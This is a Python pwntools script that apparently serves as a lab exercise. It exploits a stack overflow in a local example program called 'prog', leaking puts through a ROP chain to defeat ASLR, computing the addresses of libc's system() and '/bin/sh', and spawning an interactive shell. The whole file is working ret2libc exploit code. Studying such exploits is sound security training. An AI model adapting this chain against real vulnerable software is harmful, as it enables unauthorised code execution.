"""
ASLR Bypass Ret2Libc Exploit Script for "prog" example vulnerable program
Rahn Stavar
"""
from pwn import *
context.log_level = 'DEBUG'
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi_addr = 0x401156
puts_got_addr = 0x404018
puts_plt_addr = 0x401050
main_addr = 0x401192
ret_gadget_addr = 0x40101a

payload = b"A"*40
payload += p64(pop_rdi_addr)
payload += p64(puts_got_addr)
payload += p64(puts_plt_addr)
payload += p64(main_addr)

p = process("./prog")

p.recvuntil(b"Enter a message:\n")
p.sendline(payload)

leaked_puts_addr = u64(p.recvline().strip() + b"\x00"*2)
print("Leaked puts address:" + hex(leaked_puts_addr))

libc_base_addr = leaked_puts_addr - libc.symbols["puts"]
print("Libc base address:" + hex(libc_base_addr))

libc_system_addr = libc_base_addr + libc.symbols["system"]
print("Libc system address:" + hex(libc_system_addr))
libc_bin_sh_addr = libc_base_addr + list(libc.search(b"/bin/sh"))[0]
print("Libc /bin/sh string address:" + hex(libc_bin_sh_addr))

payload = b"A"*40
payload += p64(pop_rdi_addr)
payload += p64(libc_bin_sh_addr)
payload += p64(ret_gadget_addr) # padding the stack with a 'ret' gadget to realign the stack to 16-byte alignment before calling system()
payload += p64(libc_system_addr)

p.recvuntil(b"Enter a message:\n")
p.sendline(payload)
p.interactive()